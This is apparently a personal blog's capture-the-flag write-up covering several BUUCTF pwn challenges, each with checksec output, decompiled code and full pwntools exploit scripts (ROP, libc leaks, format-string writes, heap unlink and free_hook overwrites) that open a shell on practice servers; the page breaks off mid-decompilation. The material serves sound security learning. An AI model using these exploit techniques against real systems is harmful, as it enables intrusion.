<!DOCTYPE html>
<head>
<meta charset="UTF-8" /><title>PureWeb Blog-BUUCTF Pwn WriteUp</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="../github.css">
<link rel="stylesheet" href="../speciou.css"
</head><body>    <div class="container">        <header class="main-header">            <h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1>            <nav class="main-header__nav">                <ul class="main-nav">                    <li class="main-nav__list"><a class="main-nav__list__link active" href="/" target="_self">HOME</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="/archives/"                            target="_self">ARCHIVE</a>                    </li>                    <li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"                            target="_blank">GITHUB</a></li>                </ul>            </nav>        </header>    </div><div class="typora-export os-windows"><div id="write" class>
<p><strong>2021-3-14 9:21</strong></p>
<p>buu部分刷题记录</p>
<!-- more -->
<h2>[HarekazeCTF2019]baby_rop</h2>
<h3>1.checksec()</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-10h]

  system(&quot;echo -n \&quot;What's your name? \&quot;&quot;);
  __isoc99_scanf(&quot;%s&quot;, &amp;v4);
  printf(&quot;Welcome to the Pwn World, %s!\n&quot;, &amp;v4);
  return 0;
}
</code></pre>
<blockquote>
<p>scanf的溢出，注意，要溢出的栈+8</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,29829)

binsh_addr = 0x0601048
sys_addr = 0x00400490
pop_rdi = 0x0400683
payload = 'a'*24 + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr) + p64(0)
p.sendlineafter(&quot;?&quot;,payload)
p.interactive()
</code></pre>
<p>flag在home文件夹下的文件夹中</p>
<h2>[HarekazeCTF2019]baby_rop2</h2>
<p>环境：？</p>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[28]; // [rsp+0h] [rbp-20h]
  int v6; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf(&quot;What's your name? &quot;, 0LL);
  v3 = read(0, buf, 0x100uLL);
  v6 = v3;
  buf[v3 - 1] = 0;
  printf(&quot;Welcome to the Pwn World again, %s!\n&quot;, buf);
  return 0;
}
</code></pre>
<blockquote>
<p>printf输出read的真实地址，再ROP</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#from LibcSearcher import *
context.log_level = &quot;debug&quot;
elf=ELF('./babyrop2')
libc = ELF(&quot;./libc.so.6&quot;)
#p=process('babyrop2')
p=remote('node3.buuoj.cn',28113)

pop_rdi_ret=0x0000000000400733
pop_rsi_r15_ret=0x0000000000400731
format_addr=0x0000000000400790 # %s

printf_plt=elf.plt['printf']
read_got=elf.got['read']
main_plt=elf.sym['main']

payload = &quot;a&quot;*0x28
payload += p64(pop_rdi_ret) + p64(format_addr)
payload += p64(pop_rsi_r15_ret) + p64(read_got) + p64(0)
payload += p64(printf_plt) + p64(main_plt)

p.recvuntil(&quot;name? &quot;)
p.sendline(payload)

p.recvuntil(&quot;!\n&quot;)
read_real = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
libc_base = read_real - libc.sym['read']

sys_addr = libc.sym[&quot;system&quot;] + libc_base
binsh = libc.search(&quot;/bin/sh&quot;).next() + libc_base

payload = 'a'*0x28
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(sys_addr)

p.recvuntil(&quot;name? &quot;)
p.sendline(payload)
p.interactive()
</code></pre>
<blockquote>
<p>flag 位置在 /home/babyrop2/</p>
</blockquote>
<h2>[OGeek2019]babyrop</h2>
<h3>1.checksec()</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000) 
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main()
{
  int buf; // [esp+4h] [ebp-14h]
  char v2; // [esp+Bh] [ebp-Dh]
  int fd; // [esp+Ch] [ebp-Ch]

  sub_80486BB();
  fd = open(&quot;/dev/urandom&quot;, 0);
  if ( fd &gt; 0 )
    read(fd, &amp;buf, 4u);
  v2 = sub_804871F(buf);
  sub_80487D0(v2);
  return 0;
}
</code></pre>
<p>sub_804871F</p>
<pre><code class="language-c">int __cdecl sub_804871F(int a1)
{
  size_t v1; // eax
  char s; // [esp+Ch] [ebp-4Ch]
  char buf[7]; // [esp+2Ch] [ebp-2Ch]
  unsigned __int8 v5; // [esp+33h] [ebp-25h]
  ssize_t v6; // [esp+4Ch] [ebp-Ch]

  memset(&amp;s, 0, 0x20u);
  memset(buf, 0, 0x20u);
  sprintf(&amp;s, &quot;%ld&quot;, a1);
  v6 = read(0, buf, 0x20u);
  buf[v6 - 1] = 0;
  v1 = strlen(buf);
  if ( strncmp(buf, &amp;s, v1) )
    exit(0);
  write(1, &quot;Correct\n&quot;, 8u);
  return v5;
}
</code></pre>
<p>sub_80487D0</p>
<pre><code class="language-c">ssize_t __cdecl sub_80487D0(char a1)
{
  ssize_t result; // eax
  char buf; // [esp+11h] [ebp-E7h]

  if ( a1 == 127 )
    result = read(0, &amp;buf, 0xC8u);
  else
    result = read(0, &amp;buf, a1);
  return result;
}
</code></pre>
<blockquote>
<p>sprintf：sprintf 返回以format为格式argument为内容组成的结果被写入string的字节数，结束字符‘\0’不计入内。即，如果“Hello”被写入空间足够大的string后，函数sprintf 返回5</p>
</blockquote>
<p>也就是说第一个是'\0'可以绕过检测
string</p>
<pre><code>LOAD:0804840B	00000006	C	write
LOAD:08048411	0000000F	C	__gmon_start__
LOAD:08048420	0000000A	C	GLIBC_2.0
.rodata:08048920	0000000A	C	Time's up
.rodata:0804892E	00000009	C	Correct\n
.rodata:08048937	0000000D	C	/dev/urandom
.eh_frame:080489C7	00000005	C	;*2$\&quot;
</code></pre>
<blockquote>
<p>没有/bin/sh，没有system函数，有libc，考虑write泄露libc</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,28118)
#p = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
libc = ELF(&quot;./libc-2.23.so&quot;)

write_plt = elf.plt[&quot;write&quot;]
write_got = elf.got[&quot;write&quot;]
main_addr = 0x08048825

libc_write = libc.sym[&quot;write&quot;]
libc_system = libc.sym[&quot;system&quot;]
#binsh = next(libc.search('/bin/sh'))
binsh = 0x15902b

payload_1 = '\x00'+ '\xff'*7

paylaod_2 = 'a'*(0xe7+4) + p32(write_plt) + p32(main_addr)
paylaod_2 += p32(1) + p32(write_got) + p32(4)

p.sendline(payload_1)
p.recvuntil(&quot;Correct\n&quot;)
p.sendline(paylaod_2)

real_write = u32(p.recv(4))
libc_base = real_write - libc_write
real_system = libc_base + libc_system
binsh = binsh + libc_base

payload_1 = '\x00'+ '\xff'*7
payload_3 = 'a'*(0xe7+4) + p32(real_system) + p32(0)
payload_3 += p32(binsh)

p.sendline(payload_1)
p.recvuntil(&quot;Correct\n&quot;)
p.sendline(payload_3)
p.interactive()
</code></pre>
<blockquote>
<p>接受的4字节不需要在ljust对齐了</p>
</blockquote>
<h2>[ZJCTF 2019]EasyHeap</h2>
<blockquote>
<p>和hitocn trainning magic heap 一样</p>
</blockquote>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<pre><code>def add(sz,text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)
def edit(idx,text):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(len(text)))
	p.sendlineafter(&quot;:&quot;,str(text))
def free(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
</code></pre>
<p><strong>back_door</strong></p>
<pre><code>int l33t()
{
  return system(&quot;/bin/sh&quot;);
}
</code></pre>
<p><strong>edit_heap</strong></p>
<pre><code>printf(&quot;Size of Heap : &quot;, (char *)&amp;v1 + 4, v1);
 read(0, (char *)&amp;v1 + 4, 8uLL);
 v2 = atoi((const char *)&amp;v1 + 4);
 printf(&quot;Content of heap : &quot;, (char *)&amp;v1 + 4, v1);
 read_input(heaparray[(signed int)v1], v2);
 return puts(&quot;Done !&quot;);
</code></pre>
<blockquote>
<p>未控制边界，堆溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
elf = ELF(&quot;./magicheap&quot;)
libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)
p = process(&quot;./magicheap&quot;)
#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25535&quot;)

def add(sz,text):
	p.sendlineafter(&quot;:&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)

def edit(idx,text):
	p.sendlineafter(&quot;:&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(len(text)))
	p.sendlineafter(&quot;:&quot;,str(text))

def free(idx):
	p.sendlineafter(&quot;:&quot;,&quot;3&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

l33t = 0x6020A0
if __name__ == '__main__':
	add(0x60,'aaaa')
	add(0x60,'aaaa')
	add(0x60,'aaaa')

	free(2)
	edit(1,'a'*0x60+p64(0)+p64(0x71)+p64(l33t-0x13)) #&lt;--控制bk指针

	add(0x60,'aaaa') #2
	add(0x60,'aaaa') #3 fake_chunk
	edit(3,'a'*8)
	p.sendlineafter(&quot;:&quot;,str(0x1305))
	p.interactive()
</code></pre>
<blockquote>
<p>为什么是p64(l33t-0x13)？</p>
<blockquote>
<p>经过动态调试得知，该处是unsorted bin链表</p>
</blockquote>
<p>为什么edit(3,’a’*8)？</p>
<blockquote>
<p>覆写magic的值为‘0x6161616161616161’，从而进入后门</p>
</blockquote>
</blockquote>
<h2>[ZJCTF 2019]Login</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">printf(&quot;Please enter username: &quot;, &quot;admin&quot;);
  User::read_name((User *)&amp;login);
  printf(&quot;Please enter password: &quot;);
  v3 = (void (*)(void))main::{lambda(void)#1}::operator void (*)(void) const();
  v7 = password_checker(v3);
  User::read_password((User *)&amp;login);
  v4 = User::get_password((User *)&amp;v8);
  v5 = User::get_password((User *)&amp;login);
  password_checker(void (*)(void))::{lambda(char const*,char const*)#1}::operator() const(
    (void (__fastcall ***)(char *))&amp;v7,
    (const char *)v5,
    (const char *)v4);
  return 0;
</code></pre>
<p><strong>password_checker</strong></p>
<pre><code class="language-c">unsigned __int64 __fastcall password_checker(void (*)(void))::{lambda(char const*,char const*)#1}::operator() const(void (__fastcall ***a1)(char *), const char *a2, const char *a3)
{
  char s; // [rsp+20h] [rbp-60h]
  unsigned __int64 v5; // [rsp+78h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( !strcmp(a2, a3) )
  {
    snprintf(&amp;s, 0x50uLL, &quot;Password accepted: %s\n&quot;, &amp;s);
    puts(&amp;s);
    (**a1)(&amp;s);
  }
  else
  {
    puts(&quot;Nope!&quot;);
  }
  return __readfsqword(0x28u) ^ v5;
}
</code></pre>
<blockquote>
<p><code>strcmp</code>遇见<code>\x00</code>截断，不会判断之后的字符串，所以这里栈溢出</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,25930)
back_door = 0x400E88
payload = '2jctf_pa5sw0rd'+&quot;\x00&quot;+'a'*20+&quot;\x00&quot;+'a'*36+p64(back_door)
p.sendlineafter(&quot;username: &quot;,&quot;admin&quot;)
p.sendlineafter(&quot;password: &quot;,payload)
p.interactive()
</code></pre>
<h2>[第五空间2019 决赛]PWN5</h2>
<p>环境：ubuntu16</p>
<h3>1.checksec()</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">int __cdecl main(int a1)
{
  unsigned int v1; // eax
  int fd; // ST14_4
  int result; // eax
  int v4; // ecx
  unsigned int v5; // et1
  char nptr; // [esp+4h] [ebp-80h]
  char buf; // [esp+14h] [ebp-70h]
  unsigned int v8; // [esp+78h] [ebp-Ch]
  int *v9; // [esp+7Ch] [ebp-8h]

  v9 = &amp;a1;
  v8 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open(&quot;/dev/urandom&quot;, 0);
  read(fd, &amp;unk_804C044, 4u);
  printf(&quot;your name:&quot;);							//====+FORMAT+====
  read(0, &amp;buf, 0x63u);
  printf(&quot;Hello,&quot;);
  printf(&amp;buf);                                 
  printf(&quot;your passwd:&quot;);
  read(0, &amp;nptr, 0xFu);                         // ====+STACK_OVERFLOW+====
  if ( atoi(&amp;nptr) == unk_804C044 )
  {
    puts(&quot;ok!!&quot;);
    system(&quot;/bin/sh&quot;);
  }
  else
  {
    puts(&quot;fail&quot;);
  }
  result = 0;
  v5 = __readgsdword(0x14u);
  v4 = v5 ^ v8;
  if ( v5 != v8 )
    sub_80493D0(v4);
  return result;
}
</code></pre>
<p>unk_804C044</p>
<pre><code class="language-assembly">bss:0804C040 byte_804C040    db ?                    ; DATA XREF: sub_8049140↑o
.bss:0804C040                                         ; sub_8049140+5↑o ...
.bss:0804C041                 align 4
.bss:0804C044 randmon_num     db    ? ;               ; DATA XREF: main+77↑o
.bss:0804C044                                         ; main+108↑o
.bss:0804C045                 db    ? ;
.bss:0804C046                 db    ? ;
.bss:0804C047                 db    ? ;
.bss:0804C047 _bss            ends
.bss:0804C047
</code></pre>
<blockquote>
<p>bss段的unk_804C044，是随机生成的，而我们猜对了这个参数，就可以执行system(&quot;/bin/sh&quot;),刚好字符串格式化漏洞可以实现改写内存地址的值</p>
<p>还有就是不要被开启的canary保护迷惑</p>
</blockquote>
<h3>3.计算偏移</h3>
<pre><code>root@joe1sn:~/download/BUUCTF/PWN5# ./pwn 
your name:aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Hello,aaaa-0xffb44588-0x63-(nil)-(nil)-0x3-0xf7f8c950-0xc2-(nil)-0xc30000-0x61616161-0x2d70252d-0x252d7025-0x70252d70
</code></pre>
<p>第一个参数偏移量为10，通过%n修改</p>
<blockquote>
<p>%x是吧数据以16进制输出</p>
<p>%n是把已经输出的字符数目输入传来参数的地址中，这就可以使我们修改数据</p>
</blockquote>
<p><a href="https://www.cnblogs.com/0xJDchen/p/5904816.html">https://www.cnblogs.com/0xJDchen/p/5904816.html</a></p>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
p = remote(&quot;node3.buuoj.cn&quot;,26486)

unk_804C044 = 0x0804C044
payload=fmtstr_payload(10,{unk_804C044:0x11111111})
p.sendlineafter(&quot;your name:&quot;,payload)
p.sendlineafter(&quot;your passwd&quot;,str(0x11111111))
p.interactive()
</code></pre>
<h2>0ctf_2016_warmup</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p>从汇编看有四个函数</p>
<p><strong>Alarm 、Read 、Write 、sys_exit</strong></p>
<p>关于 <strong>Alarm</strong> 有个特性：</p>
<blockquote>
<p>如果有以前为进程登记的尚未超时的闹钟时钟，而且本次调用的seconds值是0，则取消以前的闹钟时钟，其余留值仍作为alarm函数的返回值</p>
</blockquote>
<p>那么当 <strong>alarm</strong> 剩余 5 秒时，更具汇编fastcall，会将return值返回 <strong>eax</strong> 寄存器中，那么再次使用 <strong>sys_call</strong> 的时候就会 <strong>系统调用 open函数</strong> ，从而读取到falg的值</p>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
name = &quot;warmup&quot;
elf = ELF(name)
libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
sh = 0

def main(ip,port,debug,mode):
	global sh
	if debug==0:
		context.log_level = &quot;debug&quot;
	else:
		pass
	if mode==0:
		sh = process(name)
	else:
		sh = remote(ip,port)

	main_addr = 0x804815A
	write_addr = 0x8048135
	read_addr  = 0x804811D 
	alarm_addr = 0x804810D
	data_seg = 0x80491BC
	sys_call = 0x804813A
	
    #Step1
    #向系统中传递参数 &quot;flag&quot;
	payload = 'a'*0x20
	payload += p32(read_addr)+p32(main_addr)
	payload += p32(0)+p32(data_seg)+p32(0x10)
	sh.sendafter(&quot;Welcome to 0CTF 2016!\n&quot;,payload)

	payload = 'flag\x00'
	sh.sendlineafter(&quot;Good Luck!\n&quot;,payload)	
	
    #Step2
    #0xa-5=5
    #这样剩下的就5s了
	sleep(5)
	
    #Step3
    #再次调用alarm函数就会返回剩余的秒数5到 eax寄存器中
    #就会将falg文件读取到 data段
	payload = 'a'*0x20
	payload += p32(alarm_addr)+p32(sys_call)
	payload += p32(main_addr)+p32(data_seg)+p32(0)
	sh.send(payload)
    
	#Step4
    #从data段中read
	payload = 'a'*0x20
	payload += p32(read_addr)+p32(main_addr)
	payload += p32(3)+p32(data_seg)+p32(0x50)
	sh.sendafter(&quot;Good Luck!\n&quot;,payload)	
    
	#Step5
    #利用write写出flag
	payload = 'a'*0x20
	payload += p32(write_addr)+p32(main_addr)
	payload += p32(1)+p32(data_seg)+p32(0x50)
	sh.sendafter('Good Luck!\n',payload)
 	sh.interactive()

if __name__ == '__main__':
	main(&quot;node3.buuoj.cn&quot;,&quot;28290&quot;,1,1)
</code></pre>
<h2>axb_2019_fmt32</h2>
<h3>1.cheksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2 .IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">while ( 1 )
  {
    alarm(3u);
    memset(&amp;s, 0, 0x101u);
    memset(&amp;format, 0, 0x12Cu);
    printf(&quot;Please tell me:&quot;);
    read(0, &amp;s, 0x100u);
    sprintf(&amp;format, &quot;Repeater:%s\n&quot;, &amp;s);
    if ( strlen(&amp;format) &gt; 0x10E )
      break;
    printf(&amp;format);
  }
</code></pre>
<blockquote>
<p>字符串格式化漏洞，但是没有后门，可以选择<code>libc leak</code>+改printf为<code>one gadget</code></p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
elf = ELF(&quot;./axb_2019_fmt32&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,25318)
libc = ELF(&quot;libc-2.23.so&quot;)

#0x3a80c execve(&quot;/bin/p&quot;, esp+0x28, environ)

p.sendlineafter('me:',&quot;%9$sA&quot; + p32(elf.got[&quot;printf&quot;]))
p.recvuntil('Repeater:')
printf_got = u32(p.recv(4))

base = printf_got - libc.sym[&quot;printf&quot;]
system = base + libc.sym[&quot;system&quot;]

log.success(&quot;printf addr: %x&quot; , printf_got)
log.success(&quot;system addr: %x&quot; , system)
log.success(&quot;libc base: %x&quot; , base)
payload  ='aaaaa'
payload += fmtstr_payload(9,{0x804A014: (0x3a80c+base)},write_size = &quot;byte&quot;,numbwritten = 0xe)
p.sendlineafter(&quot;me:&quot;,payload)
p.interactive()
</code></pre>
<h2>axb_2019_heap</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p><strong>banner</strong></p>
<pre><code class="language-c"> __isoc99_scanf(&quot;%s&quot;, &amp;format);
  printf(&quot;Hello, &quot;, &amp;format);
  printf(&amp;format);
</code></pre>
<blockquote>
<p>存在一个字符串格式化漏洞</p>
</blockquote>
<p><strong>main</strong></p>
<pre><code class="language-python">def add(idx,sz,text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)

def delete(idx):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

def edit(idx,text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,text)
</code></pre>
<p><strong>edit_note</strong></p>
<pre><code class="language-c">if ( v1 &lt;= 10 &amp;&amp; v1 &gt;= 0 &amp;&amp; *((_QWORD *)&amp;note + 2 * v1) )
  {
    puts(&quot;Enter the content: &quot;);
    get_input(*((_QWORD *)&amp;note + 2 * v1), *((_DWORD *)&amp;note + 4 * v1 + 2));
    puts(&quot;Done!&quot;);
  }
</code></pre>
<blockquote>
<p>没有控制范围，堆溢出，利用<code>unlink</code>+<code>free_hook</code>来getshell</p>
</blockquote>
<h3>3.GDB</h3>
<p>在printf处下断点fmtarg查看偏移</p>
<p><strong>stack</strong></p>
<pre><code>gdb-peda$ stack 20
0000| 0x7fffffffde10 --&gt; 0x0 
0008| 0x7fffffffde18 --&gt; 0x61616161ffffde30 
0016| 0x7fffffffde20 ('a' &lt;repeats 15 times&gt;)
0024| 0x7fffffffde28 --&gt; 0x61616161616161 ('aaaaaaa')
0032| 0x7fffffffde30 --&gt; 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;:	push   r15)
0040| 0x7fffffffde38 --&gt; 0x555555555186 (&lt;main+28&gt;:	mov    eax,0x0)
0048| 0x7fffffffde40 --&gt; 0x7fffffffdf30 --&gt; 0x1 
0056| 0x7fffffffde48 --&gt; 0x0 
0064| 0x7fffffffde50 --&gt; 0x555555555200 (&lt;__libc_csu_init&gt;:	push   r15)
0072| 0x7fffffffde58 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)
0080| 0x7fffffffde60 --&gt; 0x1 
0088| 0x7fffffffde68 --&gt; 0x7fffffffdf38 --&gt; 0x7fffffffe2a7 (&quot;/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap&quot;)
0096| 0x7fffffffde70 --&gt; 0x1f7ffcca0 
0104| 0x7fffffffde78 --&gt; 0x55555555516a (&lt;main&gt;:	push   rbp)
0112| 0x7fffffffde80 --&gt; 0x0 
0120| 0x7fffffffde88 --&gt; 0xa45414fa738fad69 
0128| 0x7fffffffde90 --&gt; 0x555555554980 (&lt;_start&gt;:	xor    ebp,ebp)
0136| 0x7fffffffde98 --&gt; 0x7fffffffdf30 --&gt; 0x1 
0144| 0x7fffffffdea0 --&gt; 0x0 
0152| 0x7fffffffdea8 --&gt; 0x0 

</code></pre>
<p><strong>偏移</strong></p>
<pre><code>gdb-peda$ fmtarg 0x7fffffffde50 #base offset
The index of format argument : 14 (&quot;\%13$p&quot;)
gdb-peda$ fmtarg 0x7fffffffde58 #libc offset
The index of format argument : 15 (&quot;\%14$p&quot;)
</code></pre>
<p><strong>vmmap</strong></p>
<pre><code>0x0000555555554000 0x0000555555556000 r-xp	/home/joe1sn/Documents/question/abx_2019_heap/axb_2019_heap
...........
0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
...........
</code></pre>
<pre><code class="language-python">&gt;&gt;&gt; hex(0x7ffff7a2d830 - 0x00007ffff7a0d000) #libc 偏移量
'0x20830'
&gt;&gt;&gt; hex(0x555555555200 - 0x0000555555554000)
'0x1200'
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
elf = ELF(&quot;./axb_2019_heap&quot;)
libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)
p = process(&quot;./axb_2019_heap&quot;)
#p = remote(&quot;node3.buuoj.cn&quot;,&quot;25618&quot;)

def add(idx,sz,text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,str(sz))
	p.sendlineafter(&quot;:&quot;,text)

def delete(idx):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))

def edit(idx,text):
	p.sendlineafter(&quot;&gt;&gt;&quot;,&quot;4&quot;)
	p.sendlineafter(&quot;:&quot;,str(idx))
	p.sendlineafter(&quot;:&quot;,text)

if __name__ == '__main__':
	p.sendlineafter(&quot;:&quot;,&quot;%14$p-%15$p&quot;)
	p.recvuntil(&quot;Hello, &quot;)
	axb_leak = int(p.recv(14),16)
	p.recvuntil(&quot;-&quot;)
	libc_leak = int(p.recv(14),16)

	axb_base = axb_leak-0x1200
	libc_base = libc_leak-0x20830
	bss_addr = axb_base+0x202060
	sys_addr = libc_base+libc.sym[&quot;system&quot;]
	free_addr = libc_base+libc.sym[&quot;__free_hook&quot;]

	success(&quot;axb base=&gt;0x%x&quot;,axb_leak)
	success(&quot;libc base=&gt;0x%x&quot;,libc_base)
	success(&quot;bss addr=&gt;0x%x&quot;,bss_addr)
	success(&quot;system addr=&gt;0x%x&quot;,sys_addr)
	success(&quot;free addr=&gt;0x%x&quot;,free_addr)
	
	add(0,0x98,'0'*0x98)
	add(1,0x98,'1111')
	add(2,0x90,'2222')
	add(3,0x90,'/bin/sh\x00')
		# fake chunk  fake.sz  fake.fd             fake.bk			repair	
	payload=p64(0)+p64(0x91)+p64(bss_addr-0x18)+p64(bss_addr-0x10)+p64(0)*14+p64(0x90)+'\xa0'
	edit(0,payload)
	#gdb.attach(p)
	delete(1) #free fake chunk
	#gdb.attach(p)
	edit(0,p64(0)*3+p64(free_addr)+p64(0x10))#in fake chunks
	#gdb.attach(p)
	edit(0,p64(sys_addr))#free-&gt;got
	#gdb.attach(p)
	delete(3)
	p.interactive()
</code></pre>
<h2>babyfengshui_33c3_2016</h2>
<h3>1.checksec</h3>
<pre><code>[*] '/home/joe1sn/Documents/ctf/questions/BUUCTF/pwn/babyfengshui_33c3_2016/babyfengshui'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<blockquote>
<p><code>RELRO:  Partial RELRO</code>可以改写GOT表</p>
</blockquote>
<h3>2.IDA</h3>
<p><strong>main</strong></p>
<pre><code class="language-c">void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h]
  int v1; // [esp+4h] [ebp-14h]
  size_t v2; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts(&quot;0: Add a user&quot;);
    puts(&quot;1: Delete a user&quot;);
    puts(&quot;2: Display a user&quot;);
    puts(&quot;3: Update a user description&quot;);
    puts(&quot;4: Exit&quot;);
    printf(&quot;Action: &quot;);
    if ( __isoc99_scanf(&quot;%d&quot;, &amp;v1) == -1 )
      break;
    if ( !v1 )
    {
      printf(&quot;size of description: &quot;);          // size of chunk
      __isoc99_scanf(&quot;%u%c&quot;, &amp;v2, &amp;v0);
      add_usr(v2);
    }
    if ( v1 == 1 )
    {
      printf(&quot;index: &quot;);
      __isoc99_scanf(&quot;%d&quot;, &amp;v2);
      delet_usr(v2);
    }
    if ( v1 == 2 )
    {
      printf(&quot;index: &quot;);
      __isoc99_scanf(&quot;%d&quot;, &amp;v2);
      display(v2);
    }
    if ( v1 == 3 )
    {
      printf(&quot;index: &quot;);
      __isoc99_scanf(&quot;%d&quot;, &amp;v2);
      text_rewrite(v2);
    }
    if ( v1 == 4 )
    {
      puts(&quot;Bye&quot;);
      exit(0);
    }
    if ( (unsigned __int8)byte_804B069 &gt; 0x31u )
